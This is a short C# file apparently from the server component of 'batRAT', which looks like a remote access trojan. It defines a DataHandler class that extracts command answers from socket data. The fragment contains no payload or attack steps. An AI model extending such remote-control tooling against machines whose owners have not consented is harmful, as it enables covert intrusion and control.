using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Drawing;
using System.IO;
using System.Threading.Tasks;
using System.Net.Sockets;

using batRAT;
using batRAT.Commands;

namespace Server.Core {
    public class DataHandler {

        Listener listener;
        Socket socket;

        public DataHandler(Listener _listener) {
            listener = _listener;
            socket = _listener.socket;
        }

        public CommandAnswer HandleAnswer(StateObject _state, int _bytesReceived) {
            CommandAnswer answer = Utilities.ExtractAnswer(_state, _bytesReceived);
            return answer;
        }
    }
}
